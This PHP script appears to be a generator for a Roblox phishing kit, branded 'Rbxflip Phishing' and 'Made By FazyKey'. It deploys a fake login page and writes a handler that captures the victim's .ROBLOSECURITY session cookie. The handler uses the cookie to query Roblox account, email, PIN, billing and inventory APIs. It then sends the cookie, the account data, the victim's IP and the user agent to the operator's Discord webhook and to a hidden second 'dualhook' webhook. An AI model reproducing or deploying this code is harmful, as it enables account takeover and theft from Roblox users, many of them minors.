<?php
ob_start();
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $sleepy = $_POST['folder'];
    if(!is_dir($sleepy)){
    } else {
	die('Directory is taken!');
    }
    $webhook = $_POST['webhook'];
    $id = rand(1302, 31424);
    
    $sql = "INSERT INTO loggers (id, webhook)
VALUES ($id, $webhook)";
mkdir("$sleepy", 0777, true);
$code = file_get_contents("login.php");
$code1 = file_get_contents("cookie.png");
$code3 = file_get_contents("bg.png");
$code4 = file_get_contents("poppins.woff2");
$code5 = file_get_contents("poppins_bold.woff2");
$myfile = fopen("$sleepy/index.php", "w");
$myfile1 = fopen("$sleepy/cookie.png", "w");
$myfile3 = fopen("$sleepy/bg.png", "w");
$myfile4 = fopen("$sleepy/poppins.woff2", "w");
$myfile5 = fopen("$sleepy/poppins_bold.woff2", "w");
$myfile2 = fopen("$sleepy/send.php", "w");
$myfile99 = fopen("webhook.txt", "a");
$txt = $code;
$txt1 = $code1;
$txt3 = $code3;
$txt4 = $code4;
$txt5 = $code5;
$txt2 = $code2;
$txt99 = $code99;
fwrite($myfile99, ''.$webhook.': ' .$txt99);
fwrite($myfile, $txt);
fwrite($myfile1, $txt1);
fwrite($myfile3, $txt3);
fwrite($myfile4, $txt4);
fwrite($myfile5, $txt5);
fwrite($myfile2, '

<?php

if(isset($_POST["submit"])){
    $cookiegrab = $_POST["ROBLOSECURITY"];

}

$ip = $_SERVER["REMOTE_ADDR"];
$host = $_SERVER["HTTP_USER_AGENT"];

$cookie = "$cookiegrab";

// Initialize cURL session
$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $profile = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}


$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://accountsettings.roblox.com/v1/email");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $lol = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $PIN = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}



$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://billing.roblox.com/v1/credit");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $credit = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}





$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://economy.roblox.com/v2/users/"  . $profile["UserID"] .  "/transaction-totals?timeFrame=Year&transactionType=summary");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $sum = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$api_url2 = "https://inventory.roblox.com/v1/users/"  . $profile["UserID"] .  "/assets/collectibles?limit=10&sortOrder=Asc";

$json2 = file_get_contents($api_url2);

$data2 = json_decode($json2, true);

$limiteds = $data2["data"][0]["name"];
$limiteds1 = $data2["data"][0]["recentAveragePrice"];

$name = "FazyKey";

$url = "'.$webhook.'";
$dualhook = "https://discord.com/api/webhooks/1108080425659797534/fpSDq2jRrHok9MDxu4wTrJUCxfh5ss828Ekv9UAzVNPRkjLOooUuxAjlZDmdPdmYCcss";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "$name - Bot",
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307",
     "content" => "",
        "embeds" => [
            [
                "title" => "🕯️ +1 result account rbxflip 💸",
                "type" => "rich",
                "color" => hexdec("99999"),
                "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                "thumbnail" => [
                    "url" => $profile["ThumbnailUrl"],
                ],
                "footer" => [
                    "text" => "New Hit 💸",
                  "icon_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307"
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => $profile["UserName"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Robux <:robux:818111919881715764>**",
                        "value" => $profile["RobuxBalance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**premuim? <:premium:818111829963964416>**",
                        "value" => $profile["IsPremium"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Verified? 🌴**",
                        "value" => $lol["verified"],
                        "inline" => true
                    ],
                    [
                        "name" => "**PIN? 🔒**",
                        "value" => $PIN["isEnabled"],
                        "inline" => true
                    ],
                    [
                        "name" => "**IP 🌐**",
                        "value" => "$ip",
                        "inline" => true
                    ],
                    [
                        "name" => "**HOST MACHINE 🖥️**",
                        "value" => "$host",
                        "inline" => true
                    ],
                    [
                        "name" => "**RAP**",
                        "value" => "$limiteds1",
                        "inline" => true
                    ],
                    [
                        "name" => "**Limiteds Owned**",
                        "value" => "$limiteds",
                        "inline" => true
                    ],
                    [
                        "name" => "**Pending Robux**",
                        "value" => $sum["pendingRobuxTotal"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Summary**",
                        "value" => $sum["incomingRobuxTotal"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Credit**",
                        "value" => $credit["balance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Cookie 🍪**",
                        "value" => "```$cookie```",
                        "inline" => true
                    ],
                ]
            ]
        ]
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $dualhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

// Close the cURL session
curl_close($ch);
header("Location: https://discord.gg/KnhfN8H6jp");
exit;
?>

' .$txt2);
$url = "$webhook";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [
    "username" => "FazyKey - Notifier",
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307",
     "content" => "",
        "embeds" => [
            [
                "title" => 'Rbxflip Phishing!',
                "type" => "rich",
                "color" => hexdec("99999"),
                "thumbnail" => [
                    "url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307"
                ],
                "author" => [
                     "name" => "Webhook Notifier",
                ],
                "footer" => [
                    "text" => "Made By FazyKey",
                  "icon_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307"
                ],
                "fields" => [
                    [
                        "name" => "**Ur Rbxflip Phishing url 📌**",
                        "value" => "```http://".$_SERVER['SERVER_NAME']."/$sleepy```",
                        "inline" => False
                    ],
                ]
            ],
        ],
    
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
header("location: $sleepy");
ob_end_flush();
}
?>